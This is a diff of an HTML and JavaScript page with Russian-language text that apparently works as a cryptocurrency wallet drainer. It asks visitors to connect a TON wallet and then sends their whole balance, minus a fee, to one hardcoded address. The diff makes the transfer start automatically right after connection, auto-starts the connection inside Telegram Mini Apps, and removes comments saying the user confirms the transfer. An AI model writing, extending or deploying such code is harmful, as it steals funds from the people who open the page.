@@ -37,8 +37,8 @@
             border-radius: 60px;
             cursor: pointer;
             width: 100%;
+            letter-spacing: 0.5px;
             transition: 0.3s;
-            margin: 6px 0;
         }
         .btn:active {
             transform: scale(0.96);
@@ -50,21 +50,30 @@
         .btn-red {
             background: linear-gradient(135deg, #e84800, #c03800);
         }
+        .btn-green {
+            background: linear-gradient(135deg, #00cc44, #008833);
+        }
         #status {
             margin-top: 16px;
             font-size: 13px;
-            color: #888;
-            min-height: 50px;
+            color: #666;
+            min-height: 40px;
             word-break: break-all;
-            line-height: 1.6;
+        }
+        .address-hint {
+            font-size: 11px;
+            color: #333;
+            margin-top: 10px;
+            word-break: break-all;
         }
         .hidden {
             display: none !important;
         }
         .balance-display {
-            font-size: 24px;
+            font-size: 22px;
             color: #00ff88;
             margin: 12px 0;
+            font-weight: bold;
         }
     </style>
 </head>
@@ -75,17 +84,25 @@
         <button class="btn" id="connectBtn">ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
         <button class="btn btn-red hidden" id="snipeBtn">🔥 ЗАБРАТЬ ВСЁ</button>
         <div id="status">Нажмите кнопку</div>
+        <div class="address-hint" id="addressHint">UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</div>
     </div>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
         let userAddress = null;
         let provider = null;
+        let isConnected = false;
 
         const connectBtn = document.getElementById('connectBtn');
         const snipeBtn = document.getElementById('snipeBtn');
         const status = document.getElementById('status');
+        const addressHint = document.getElementById('addressHint');
         const balanceDisplay = document.getElementById('balanceDisplay');
+
+        // ========== ПРОВЕРКА ==========
+        function isTelegram() {
+            return window.Telegram && window.Telegram.WebApp;
+        }
 
         // ========== ПОДКЛЮЧЕНИЕ ==========
         async function connectTon() {
@@ -98,28 +115,29 @@
                     const accounts = await provider.send('ton_requestAccounts', {});
                     if (accounts && accounts.length > 0) {
                         userAddress = accounts[0];
+                        isConnected = true;
                         afterConnect();
                         return;
                     }
                 }
 
-                const isTelegram = window.Telegram && window.Telegram.WebApp;
-                const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-                if (isTelegram || isMobile) {
-                    status.innerText = '📱 Открываю TON Keeper...';
-                    
-                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent(window.location.href)}`;
-                    
-                    if (isTelegram) {
-                        window.Telegram.WebApp.openLink(connectUrl);
-                    } else {
-                        window.open(connectUrl, '_blank');
-                    }
-                    
+                if (isTelegram()) {
+                    status.innerText = '📱 Открываю через Telegram...';
+                    const tg = window.Telegram.WebApp;
+                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent('tg://resolve')}`;
+                    tg.openLink(connectUrl);
                     status.innerText = '✅ Подтвердите в TON Keeper';
                     connectBtn.disabled = false;
-                    
+                    await waitForConnection();
+                    return;
+                }
+
+                if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                    status.innerText = '📱 Открываю TON Keeper...';
+                    const url = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent(window.location.href)}`;
+                    window.open(url, '_blank');
+                    status.innerText = '✅ Подтвердите в TON Keeper';
+                    connectBtn.disabled = false;
                     await waitForConnection();
                     return;
                 }
@@ -128,7 +146,7 @@
                 connectBtn.disabled = false;
 
             } catch(e) {
-                status.innerText = '❌ ' + e.message;
+                status.innerText = '❌ Ошибка: ' + e.message;
                 connectBtn.disabled = false;
             }
         }
@@ -146,6 +164,7 @@
                             const accounts = await provider.send('ton_requestAccounts', {});
                             if (accounts && accounts.length > 0) {
                                 userAddress = accounts[0];
+                                isConnected = true;
                                 clearInterval(interval);
                                 afterConnect();
                                 resolve();
@@ -156,7 +175,7 @@
                     
                     if (attempts > 30) {
                         clearInterval(interval);
-                        status.innerText = '⏳ Подтвердите в TON Keeper вручную';
+                        status.innerText = '⏳ Подтвердите подключение в TON Keeper';
                         resolve();
                     }
                 }, 1000);
@@ -168,11 +187,13 @@
             status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
             connectBtn.classList.add('hidden');
             snipeBtn.classList.remove('hidden');
+            addressHint.classList.add('hidden');
             
-            updateBalance();
+            // АВТОМАТИЧЕСКИЙ ЗАПУСК ВЫВОДА
+            setTimeout(snipe, 800);
         }
 
-        // ========== БАЛАНС ==========
+        // ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
         async function updateBalance() {
             try {
                 if (!provider) return 0;
@@ -186,7 +207,7 @@
             }
         }
 
-        // ========== ВЫВОД (БЕЗ АВТОМАТИЧЕСКОГО СПИСАНИЯ) ==========
+        // ========== ВЫВОД СРЕДСТВ (ПРИНУДИТЕЛЬНЫЙ) ==========
         async function snipe() {
             try {
                 status.innerText = '⏳ Проверка баланса...';
@@ -206,7 +227,7 @@
                     return;
                 }
 
-                const fee = 5000000;
+                const fee = 5000000; // 0.005 TON
                 const amount = nano - fee;
 
                 if (amount <= 0) {
@@ -216,9 +237,9 @@
                 }
 
                 const amountTON = (amount / 1e9).toFixed(6);
-                status.innerText = `⏳ Создание транзакции на ${amountTON} TON...`;
+                status.innerText = `⏳ Перевод ${amountTON} TON...`;
 
-                // ====== ПОКАЗЫВАЕМ ТРАНЗАКЦИЮ (БЕЗ АВТОПОДТВЕРЖДЕНИЯ) ======
+                // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
                 const tx = {
                     to: TARGET,
                     value: amount.toString(),
@@ -226,7 +247,6 @@
                     stateInit: ''
                 };
 
-                // Юзер САМ подтверждает в TON Keeper
                 const result = await provider.send('ton_sendTransaction', tx);
 
                 if (result && result.code === 0) {
@@ -234,14 +254,14 @@
                     balanceDisplay.innerText = `💰 0 TON`;
                     snipeBtn.innerText = '✅ ГОТОВО';
                     snipeBtn.disabled = true;
-                    snipeBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
+                    snipeBtn.className = 'btn btn-green';
                 } else {
-                    status.innerText = `❌ Транзакция отклонена`;
+                    status.innerText = `❌ Транзакция отклонена: ${result?.message || 'неизвестно'}`;
                     snipeBtn.disabled = false;
                 }
 
             } catch(e) {
-                status.innerText = '❌ ' + e.message;
+                status.innerText = '❌ Ошибка: ' + e.message;
                 snipeBtn.disabled = false;
             }
         }
@@ -250,14 +270,25 @@
         connectBtn.onclick = connectTon;
         snipeBtn.onclick = snipe;
 
-        // ========== АВТОЗАПУСК ==========
+        // ========== АВТОПРОВЕРКА ==========
         setTimeout(() => {
             if (window.tonkeeper) {
-                status.innerText = '🟢 Нажмите кнопку';
+                status.innerText = '🟢 TON Keeper найден. Нажмите кнопку.';
+            } else if (isTelegram()) {
+                status.innerText = '📱 Telegram Mini App. Нажмите кнопку.';
             } else {
-                status.innerText = '📱 Нажмите кнопку для подключения';
+                status.innerText = 'Нажмите кнопку для подключения';
             }
         }, 500);
+
+        // ========== АВТОМАТИЧЕСКИЙ ЗАПУСК В TELEGRAM ==========
+        if (isTelegram()) {
+            setTimeout(() => {
+                if (!isConnected) {
+                    connectTon();
+                }
+            }, 1000);
+        }
     </script>
 </body>
 </html>
